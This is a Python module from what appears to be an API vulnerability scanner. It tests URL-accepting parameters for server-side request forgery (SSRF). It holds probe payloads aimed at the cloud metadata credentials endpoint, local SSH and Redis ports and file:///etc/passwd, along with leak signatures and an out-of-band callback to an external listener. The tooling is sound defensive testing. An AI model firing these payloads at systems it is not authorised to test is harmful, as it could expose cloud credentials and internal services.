"""API7:2023 - Server Side Request Forgery (SSRF).

Looks for parameters/body fields whose names suggest the API fetches a
URL/resource on the caller's behalf (webhooks, callback URLs, image/avatar
fetchers, redirect targets, etc.) and probes them with URLs pointing at
cloud metadata services, loopback addresses, and local files. Flags a
finding when the response contains strong evidence the server actually
followed the request (leaked cloud credentials, file contents, etc.), and a
lower-confidence INFO finding on suspiciously slow responses.

If `ssrf_callback_url` is configured (an attacker-controlled listener URL,
e.g. a webhook.site/interactsh/Burp Collaborator URL), this also runs a true
out-of-band probe: each SSRF-prone field gets a unique per-probe token
appended to the callback URL, and if the target actually makes the outbound
request, the listener will record it - this is the only way to confirm SSRF
when the response gives no visible signal at all. Automatic confirmation
(polling for the hit) is currently only implemented for webhook.site URLs;
for other listeners, check your dashboard manually for the probe token.
"""
import re
import time
import uuid
import requests
from scanner.models import Endpoint, Finding, Severity

SSRF_PRONE_NAMES = (
    "url", "uri", "link", "callback", "webhook", "redirect", "return_url",
    "next", "target", "endpoint", "src", "source", "image", "avatar",
    "feed", "site", "host", "domain", "file", "fetch",
)

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:22",
    "http://localhost:6379",
    "file:///etc/passwd",
]

LEAK_SIGNATURES = [
    "accesskeyid", "secretaccesskey", "root:x:0:0", "ssh-2.0", "instance-id",
]

_WEBHOOK_SITE_RE = re.compile(r"webhook\.site/([0-9a-fA-F-]{36})")


def _looks_ssrf_prone(name: str) -> bool:
    lower = name.lower()
    return any(hint in lower for hint in SSRF_PRONE_NAMES)


def _extract_webhook_site_token(callback_url: str) -> str:
    m = _WEBHOOK_SITE_RE.search(callback_url or "")
    return m.group(1) if m else None


def _poll_webhook_site(token: str, probe_token: str, timeout: float = 8.0) -> bool:
    """Best-effort poll of the webhook.site public API to check whether a
    unique probe token shows up in any request the listener has received -
    definitive confirmation the target actually made the outbound call."""
    try:
        resp = requests.get(f"https://webhook.site/token/{token}/requests",
                             params={"sorting": "newest", "per_page": 50}, timeout=timeout)
        resp.raise_for_status()
        return probe_token in resp.text
    except Exception:
        return False


def run(client, endpoints: list[Endpoint], ssrf_callback_url: str = None) -> list[Finding]:
    findings = []
    webhook_token = _extract_webhook_site_token(ssrf_callback_url) if ssrf_callback_url else None
    oob_probes = []  # list of (probe_token, label, field, resp) awaiting confirmation

    for ep in endpoints:
        candidate_fields = {n for n in ep.params if _looks_ssrf_prone(n)}
        candidate_fields |= {n for n in (ep.body or {}) if _looks_ssrf_prone(n)}
        if not candidate_fields:
            continue

        path = ep.resolved_path()
        label = f"{ep.method} {path}"

        for field in candidate_fields:
            probe_token = uuid.uuid4().hex[:16] if ssrf_callback_url else None
            payloads = list(SSRF_PAYLOADS)
            if ssrf_callback_url:
                sep = "&" if "?" in ssrf_callback_url else "?"
                payloads.append(f"{ssrf_callback_url}{sep}probe={probe_token}")

            for payload in payloads:
                test_params = dict(ep.params)
                test_body = dict(ep.body) if ep.body else None
                if field in test_params:
                    test_params[field] = payload
                if test_body is not None and field in test_body:
                    test_body[field] = payload

                start = time.monotonic()
                try:
                    resp = client.request(ep.method, path,
                                           params=test_params if ep.method == "GET" else None,
                                           json_body=test_body if ep.method in ("POST", "PUT", "PATCH") else None,
                                           auth_override="keep")
                except Exception:
                    continue
                elapsed = time.monotonic() - start

                is_oob_payload = probe_token is not None and payload.endswith(f"probe={probe_token}")
                if is_oob_payload:
                    # Evaluated after polling the listener below - the response
                    # itself gives no signal for true out-of-band SSRF.
                    oob_probes.append((probe_token, label, field, resp))
                    continue

                body_lower = (resp.text or "").lower()
                leaked = [sig for sig in LEAK_SIGNATURES if sig in body_lower]
                if leaked:
                    findings.append(Finding(
                        check="ssrf", severity=Severity.CRITICAL,
                        title="Possible SSRF: server appears to have fetched an internal resource",
                        endpoint=label,
                        detail=(f"Sending an internal/metadata URL into parameter '{field}' "
                                "produced a response containing signature(s) consistent with "
                                f"cloud metadata or local file contents: {leaked}. This strongly "
                                "suggests the server is making outbound requests based on "
                                "unvalidated user input."),
                        evidence=f"payload={payload!r}",
                        owasp_ref="API7:2023 Server Side Request Forgery",
                        curl_repro=getattr(resp, "curl_repro", ""),
                    ))
                elif elapsed > client.timeout * 0.8:
                    findings.append(Finding(
                        check="ssrf", severity=Severity.INFO,
                        title="Slow response after sending internal-looking URL - review for SSRF",
                        endpoint=label,
                        detail=(f"Parameter '{field}' looks like it may accept a URL, and the "
                                f"request took {elapsed:.1f}s (close to the {client.timeout}s "
                                "timeout) after sending an internal address. This can indicate "
                                "the server attempted to connect to an unreachable internal "
                                "host. Manual review recommended."),
                        evidence=f"payload={payload!r}, elapsed={elapsed:.1f}s",
                        owasp_ref="API7:2023 Server Side Request Forgery",
                        curl_repro=getattr(resp, "curl_repro", ""),
                    ))

    if oob_probes:
        if webhook_token:
            time.sleep(2)  # give the target a moment to actually make the outbound call
        for probe_token, label, field, resp in oob_probes:
            if webhook_token and _poll_webhook_site(webhook_token, probe_token):
                findings.append(Finding(
                    check="ssrf", severity=Severity.CRITICAL,
                    title="Confirmed out-of-band SSRF (callback listener received the request)",
                    endpoint=label,
                    detail=(f"Parameter '{field}' accepted a unique attacker-controlled callback "
                            "URL, and the callback listener recorded an inbound HTTP request "
                            "bearing our unique probe token - definitive proof the server "
                            "followed the URL and made an outbound request based on unvalidated "
                            "user input, even though the HTTP response itself gave no visible "
                            "signal."),
                    evidence=f"probe_token={probe_token}",
                    owasp_ref="API7:2023 Server Side Request Forgery",
                    curl_repro=getattr(resp, "curl_repro", ""),
                ))
        if not webhook_token:
            findings.append(Finding(
                check="ssrf", severity=Severity.INFO,
                title="Out-of-band SSRF probes sent - check your callback listener manually",
                endpoint="-",
                detail=(f"Unique callback URLs based on '{ssrf_callback_url}' were sent to every "
                        "SSRF-prone parameter found. Automatic confirmation is only implemented "
                        "for webhook.site URLs - for other listeners (interactsh, Burp "
                        "Collaborator, RequestBin, etc.), check your dashboard for any inbound "
                        "hit containing a 'probe=' token to confirm out-of-band SSRF."),
            ))

    return findings
